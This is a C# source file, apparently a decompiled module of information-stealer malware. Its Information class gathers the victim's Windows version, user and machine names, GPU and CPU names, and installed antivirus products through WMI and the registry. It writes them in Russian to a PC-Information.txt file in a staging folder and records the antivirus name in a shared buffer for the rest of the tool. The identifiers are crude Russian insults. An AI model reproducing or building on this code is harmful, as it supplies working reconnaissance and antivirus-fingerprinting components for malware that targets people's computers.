using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Management;

internal class Information
{
	private static List<string> ishi_pidor(string _class, string anus_blyat)
	{
		List<string> list = new List<string>();
		ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM " + _class);
		try
		{
			foreach (ManagementObject item in managementObjectSearcher.Get())
			{
				list.Add(item[anus_blyat].ToString().Trim());
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	protected static string[] AVDetect()
	{
		try
		{
			ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct").Get();
			string text = "";
			int num = 0;
			foreach (ManagementBaseObject item in managementObjectCollection)
			{
				num++;
				text = string.Format("{0}[{1}] {2}\n", text, num, item["displayName"]?.ToString());
			}
			return new string[2]
			{
				num.ToString(),
				text.Trim()
			};
		}
		catch
		{
		}
		return new string[2]
		{
			"0",
			""
		};
	}

	public static void Start()
	{
		string path = $"{Buffer.path_l}PC-Information.txt";
		try
		{
			string[] array = AVDetect();
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
			string text = string.Concat("Название системы: ", registryKey.GetValue("ProductName"), " x", IntPtr.Size * 8, ".\n\nИмя пользователя: ", Environment.UserName, ".\nИмя компьютера: ", Environment.MachineName, ".\n\nВидеокарта: ", ishi_pidor("Win32_VideoController", "Name")[0], ".\nПроцессор: ", ishi_pidor("Win32_Processor", "Name")[0], ".\n\nУстановленные Антивирусы: ", (array[0] == "0") ? "Нету." : ("\n----------------------------------\n" + array[1] + "\n----------------------------------\n\n")) ?? "";
			if (array[0] != "0")
			{
				Buffer.XBufferData[18] = array[1].Split('\n')[0].Substring(4) + ((array[1].Split('\n').Length >= 2) ? "+" : "");
			}
			File.WriteAllText(path, text.Replace("\n", Environment.NewLine));
			return;
		}
		catch
		{
			File.WriteAllText(path, "");
		}
		Buffer.XBufferData[18] = "0";
	}
}
